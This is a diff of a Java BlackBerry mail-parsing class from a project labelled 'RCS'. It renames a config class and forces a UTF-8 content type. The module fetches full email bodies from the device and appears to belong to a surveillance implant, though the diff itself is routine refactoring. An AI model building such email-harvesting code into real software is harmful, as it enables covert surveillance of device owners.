@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.module.mail;
 
 import java.io.UnsupportedEncodingException;
@@ -20,7 +20,7 @@ import net.rim.blackberry.api.mail.SupportedAttachmentPart;
 import net.rim.blackberry.api.mail.TextBodyPart;
 import net.rim.blackberry.api.mail.Transport;
 import net.rim.blackberry.api.mail.UnsupportedAttachmentPart;
-import blackberry.config.Conf;
+import blackberry.config.Cfg;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -198,9 +198,9 @@ public class MailParser {
             if (mbp.hasMore() && !mbp.moreRequestSent()) {
                 try {
                     //#ifdef DEBUG
-                    debug.info("There's more text: " + Conf.FETCH_WHOLE_EMAIL);
+                    debug.info("There's more text: " + Cfg.FETCH_WHOLE_EMAIL);
                     //#endif
-                    if (Conf.FETCH_WHOLE_EMAIL) {
+                    if (Cfg.FETCH_WHOLE_EMAIL) {
                         Transport.more(mbp, true);
                     }
                 } catch (final Exception ex) {
@@ -217,9 +217,9 @@ public class MailParser {
             if (mbp.hasMore() && !mbp.moreRequestSent()) {
                 try {
                     //#ifdef DEBUG
-                    debug.info("There's more html: " + Conf.FETCH_WHOLE_EMAIL);
+                    debug.info("There's more html: " + Cfg.FETCH_WHOLE_EMAIL);
                     //#endif
-                    if (Conf.FETCH_WHOLE_EMAIL) {
+                    if (Cfg.FETCH_WHOLE_EMAIL) {
                         Transport.more(mbp, true);
                     }
                 } catch (final Exception ex) {
@@ -246,9 +246,8 @@ public class MailParser {
         //#endif
 
         String mimeType = tbp.getContentType();
-        if (Conf.MAIL_TEXT_FORCE_UTF8) {
-            mimeType = "text/plain; charset=UTF-8";
-        }
+
+        mimeType = "text/plain; charset=UTF-8";
 
         mail.plainTextMessageContentType = "Content-Type: " + mimeType
                 + "\r\n\r\n";
@@ -280,7 +279,7 @@ public class MailParser {
 
         if (tbp.hasMore() && !tbp.moreRequestSent()) {
             try {
-                if (Conf.FETCH_WHOLE_EMAIL) {
+                if (Cfg.FETCH_WHOLE_EMAIL) {
                     Transport.more(tbp, true);
                 }
             } catch (final Exception ex) {
